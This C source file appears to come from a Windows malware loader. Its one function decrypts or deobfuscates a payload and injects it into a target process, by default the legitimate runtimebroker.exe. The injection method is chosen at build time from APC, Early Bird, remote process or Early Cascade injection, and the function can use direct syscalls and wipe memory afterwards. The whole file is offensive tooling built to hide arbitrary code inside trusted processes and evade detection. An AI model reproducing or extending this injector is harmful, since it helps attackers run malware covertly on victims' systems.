#include "injectors.h"


BOOL inject_payload(LPVOID Payload, SIZE_T PayloadSize, ...) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    BOOL bSuccess = FALSE;
    volatile LPWSTR szProcessName = L"runtimebroker.exe";

    va_list args;
    va_start(args, PayloadSize);

#if defined(PROCESS_NAME_ENABLED)
    LPWSTR processName = va_arg(args, LPWSTR);
    if (processName != NULL) {
        szProcessName = processName;
    }
#endif

    PBYTE decryptedPayload = (PBYTE)Payload;
    SIZE_T decryptedPayloadSize = 0;
#if defined(OBFUSCATED_PAYLOAD) || defined(ENCRYPTED_PAYLOAD)
    bSuccess = deobfuscatePayload(Payload, PayloadSize, &decryptedPayload, &decryptedPayloadSize);
    if (!bSuccess) {
        DebugPrint("[X] Failed to deobfuscate payload.\n");
        return FALSE;
    }
#endif

#if defined(APC_INJECTION)
    DebugPrint("[#] Injecting Payload via APC ...\n");
    bSuccess = ApcInjection(hProcess, hThread, decryptedPayload, decryptedPayloadSize);
#elif defined(EARLY_BIRD_INJECTION)
    DebugPrint("[#] Injecting Payload via Early Bird Injection ...\n");
    bSuccess = EarlyBirdApcInjection(hProcess, hThread, szProcessName, decryptedPayload, decryptedPayloadSize);
#elif defined(REMOTE_PROCESS_INJECTION)
    DebugPrint("[#] Injecting Payload via Remote Process Injection ...\n");
    bSuccess = RemoteProcessInjection(hProcess, szProcessName, decryptedPayload, decryptedPayloadSize);
#elif defined(EARLY_CASCADE_INJECTION)
    DebugPrint("[#] Injecting Payload via Early Cascade Injection ...\n");
    bSuccess = EarlyCascadeInjection(hProcess, hThread, szProcessName, decryptedPayload, decryptedPayloadSize);
#endif

    RtlSecureZeroMemory(decryptedPayload, decryptedPayloadSize);
#ifdef SYSCALL_ENABLED
    NtFreeVirtualMemory(hProcess, decryptedPayload, &decryptedPayloadSize, MEM_RELEASE);
#else
    VirtualFree(decryptedPayload, 0, MEM_RELEASE);
#endif

    va_end(args);
    return bSuccess;
}
